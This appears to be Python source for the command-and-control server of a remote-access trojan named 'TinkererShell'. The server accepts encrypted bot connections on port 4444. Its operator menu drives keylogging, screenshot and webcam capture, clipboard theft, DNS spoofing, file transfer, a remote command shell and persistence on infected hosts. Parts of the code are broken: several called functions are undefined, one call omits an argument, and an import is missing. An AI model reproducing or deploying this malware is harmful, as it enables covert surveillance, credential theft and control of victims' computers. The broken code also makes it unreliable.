import sys
import os
import cmd
import threading
from time import sleep
from base64 import b64decode
from random import randrange
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, timeout

from my_crypt_func import encode_aes, decode_aes
from my_logger import logging

connected_sockets = []
active_bot = 1000
thr_exit = threading.Event()

def connection_gate():
    """Thread that keeps accepting new bots, assigning ports, and passing them to other threads doing keep-alive."""
    host = ''
    port = 4444
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((host, port))
    logging(data_to_log='\nWelcome to TinkererShell!\n', printer=True)
    logging(data_to_log=('Listening on 0.0.0.0:%s...' % str(port)), printer=True)

    s.listen(10)
    while True:
        so = s
        so.settimeout(60)
        try:
            conn_gate, addr = so.accept()
            break
        except timeout:
            if thr_exit.isSet():
                break
        if thr_exit.isSet():
            break
        lengthcrypt = conn_gate.recv(1024).decode('utf-8')
        expected_length = int(decode_aes(lengthcrypt))
        encrypted_received_data = ''
        while len(encrypted_received_data) < expected_length:
            encrypted_received_data += conn_gate.recv(1024).decode('utf-8')
        clear_text = decode_aes(encrypted_received_data)
        logging(data_to_log=('Connection established with: ' + str(addr).split('\'')[1]), printer=True)
        while True:
            new_port = randrange(5000, 6000)
            try:
                new_so = socket(AF_INET, SOCK_STREAM)
                new_so.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                new_so.bind((host, new_port))
                encrypted = encode_aes(str(new_port))
                conn_gate.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                sleep(1)
                conn_gate.send(bytes(encrypted, 'utf-8'))
                threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
                break
            except os.error as exception_gate:
                if exception_gate.errno == 98:
                    print("Port is already in use")
                else:
                    print(exception_gate)
            if thr_exit.isSet():
                break
        if thr_exit.isSet():
            break

def handler(new_so, new_port, username):
    """Keep-alive the connected bots."""
    global connected_sockets
    new_so.listen(10)
    conn_handler, addr = new_so.accept()
    lengthcrypt = conn_handler.recv(1024)
    expected_length = int(decode_aes(lengthcrypt))
    encrypted_received_data = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn_handler.recv(1024).decode('utf-8')
    a = decode_aes(encrypted_received_data)
    if a == username:
        logging(data_to_log=('Connection consolidated with: {}\t{}'.format(str(addr).split('\'')[1], username)), printer=True)
        connected_sockets.append({'conn': conn_handler, 'port': new_port, 'ip': str(addr).split('\'')[1], 'username': username, 'status': True})
        position = len(connected_sockets) - 1
        while True:
            if position != active_bot:
                encrypted = encode_aes('KeepAlive')
                conn_handler.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                sleep(1)
                conn_handler.send(bytes(encrypted, 'utf-8'))
            sleep(60)
            if thr_exit.isSet():
                break
    conn_handler.close()

def sender(conn, data_to_send: str) -> bool:
    """Send a string to the connected bot."""
    if not data_to_send:
        data_to_send = 'Ok (no output)'
    encrypted = encode_aes(data_to_send)
    conn.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
    sleep(1)
    conn.send(bytes(encrypted, 'utf-8'))
    return True

def receiver(conn, printer=False) -> str:
    """Receive encrypted data and return clear-text string."""
    lengthcrypt = conn.recv(1024).decode('utf-8')
    expected_length = int(decode_aes(lengthcrypt))
    encrypted_received_data = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn.recv(1024).decode('utf-8')
    clear_text = decode_aes(encrypted_received_data)
    if printer:
        logging(data_to_log=clear_text, printer=True)
    return clear_text

def ask_input(phrase=None, send=False) -> str:
    """Ask for user input with a custom phrase or default to >>>. If needed, send input to connected bot."""
    if phrase:
        user_input = input(phrase)
        logging(data_to_log=(''.join((phrase, user_input))))
        if send:
            sender(user_input)
    else:
        user_input = input('>>> ')
        logging(data_to_log=('>>> ' + user_input))
        if send:
            sender(user_input)
    return user_input

def quit_utility() -> bool:
    """Ask if user wants to terminate backdoor threads in connected bots and kill them, then exits."""
    global conn
    global thr_exit
    double_check = ask_input(phrase='Are you sure? yes/no\n')
    if double_check == 'yes':
        kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
        for bot in connected_sockets:
            if bot['status']:
                conn = bot['conn']
                if kill_all == 'yes':
                    sender(conn, 'SHkill')
                else:
                    sender(conn, 'SHquit')
                response = receiver(conn)
                if response != 'mistochiudendo':
                    logging(data_to_log=response, printer=True)
        thr_exit.set()
        return True
    logging(data_to_log='Operation aborted\n', printer=True)
    return False

class BotSwitcher(cmd.Cmd):
    """Bots selection handler."""
    global active_bot
    global conn
    prompt = '\n(SHbots) '

    def do_SHbots(self, option):
        """SHbots [option]\n\tlist: List connected bots\n\t[bot number]: Interact with target bot"""
        global active_bot
        global conn
        if option:
            if option == 'list':
                active_bots_str = '\nActive bots:'
                inactive_bots_str = '\n\nInactive bots:'
                for bots_counter, bot in enumerate(connected_sockets):
                    if bot['status']:
                        active_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                    else:
                        inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot using "SHbots [bot-number]"\n'
                logging(data_to_log=printable_bots, printer=True)
            elif option.isdigit():
                try:
                    if connected_sockets[int(option)]['status']:
                        double_check = ask_input(phrase='Are you sure? yes/no\n')
                        if double_check == 'yes':
                            active_bot = int(option)
                            conn = connected_sockets[int(option)]['conn']
                            tinkerer_menu()
                        else:
                            logging(data_to_log='Selection canceled\n', printer=True)
                except Exception as exception_default:
                    if str(exception_default) == 'list index out of range':
                        logging(data_to_log='The selected bot does not exist\n', printer=True)
                    else:
                        logging(data_to_log=str(exception_default), printer=True)
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    def do_SHquit(self, option) -> bool:
        """SHquit\n\tQuit and close the connection"""
        return quit_utility()

    def emptyline(self):
        pass

    def precmd(self, line):
        logging(data_to_log=('\n(Bots) ' + line))
        return cmd.Cmd.precmd(self, line)

    def postloop(self):
        logging(data_to_log='\nQuitting!', printer=True)

def tinkerer_menu():
    TinkererShellInput().cmdloop()

class TinkererShellInput(cmd.Cmd):
    """TinkererShell."""
    prompt = '\n(SHCmd) '

    def do_SHprocess(self, option):
        """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process"""
        if option:
            if option == 'list':
                sender(conn, 'SHprocesslist')
                receiver(conn, printer=True)
            elif option == 'kill':
                processkiller()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    def do_SHdns(self, option):
        """SHdns [option]\n\tstart: Start DNS spoofing\n\tstop: Stop DNS spoofing"""
        if option:
            if option == 'start':
                dnsspoofer()
            elif option == 'stop':
                sender(conn, 'SHdnsstop')
                receiver(conn, printer=True)
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    def do_SHkeylog(self, option):
        """SHkeylog [option]\n\tstatus: Show status of the keylogger\n\tstart: Start keylogger\n\tstop: Stop keylogger\n\tdownload: Download keylogged data to local machine and delete it from remote bot\n\tshow: Show downloaded keylogged data"""
        if option:
            if option == 'status':
                sender(conn, 'SHkeylogstatus')
                receiver(conn, printer=True)
            elif option == 'start':
                sender(conn, 'SHkeylogstart')
                receiver(conn, printer=True)
            elif option == 'stop':
                sender(conn, 'SHkeylogstop')
                receiver(conn, printer=True)
            elif option == 'download':
                keylogdownloader()
            elif option == 'show':
                keylogshower()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    def do_SHscreenshot(self, option):
        """SHscreenshot\n\tGrab a screenshot of the whole screen (multiple monitors supported)"""
        screenshot()

    def do_SHwebcampic(self, option):
        """SHwebcampic\n\tGrab a picture using the webcam of the remote host"""
        webcam_pic()

    def do_SHclipboard(self, option):
        """SHclipboard\n\tDownload clipboard content from bot"""
        clip_copy()

    def do_SHdownload(self, option):
        """SHdownload\n\tDownload a file"""
        downloader()

    def do_SHupload(self, option):
        """SHupload\n\tUpload a file"""
        uploader()

    def do_SHexec(self, option):
        """SHexec\n\tUse remote system command shell"""
        command_executer()

    def do_SHpersistence(self, option):
        """SHpersistence [option]\n\tstatus: Show status of the persistence module\n\tenable: Enable persistence installation\n\tdisable: Disable persistence installation"""
        if option == 'enable':
            sender(conn, 'SHpersistenceenable')
            receiver(conn, printer=True)
        elif option == 'disable':
            sender(conn, 'SHpersistencedisable')
            receiver(conn, printer=True)
        elif option == 'status':
            sender(conn, 'SHpersistencestatus')
            receiver(conn, printer=True)
        else:
            print('Aborted: unknown option\n')

    def do_SHreturn(self, option):
        """SHreturn\n\tReturn to TinkererShell bot selection mode."""
        logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
        return True

    def do_SHkill(self, option):
        """SHkill\n\tKill current bot and return to TinkererShell bot selection mode."""
        return kill_current_bot()

    def emptyline(self):
        pass

    def precmd(self, line):
        logging(data_to_log=('\n(Cmd) ' + line))
        return cmd.Cmd.precmd(self, line)

if __name__ == '__main__':
    if os.path.isfile('sessionlog.txt') and not os.access('sessionlog.txt', os.W_OK):
        chiusura = input('[-] sessionlog.txt access to log file denied.\nTry running this program as root... Press Enter to exit...')
        sys.exit(0)
    try:
        f = open('sessionlog.txt', 'a')
        f.write('\n\n\n\n\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n[*] Start of session\'s logs [*]\n')
        f.close()
    except Exception as exception:
        print(exception)

    threading.Thread(target=connection_gate).start()
    sleep(5)
    BotSwitcher().cmdloop()
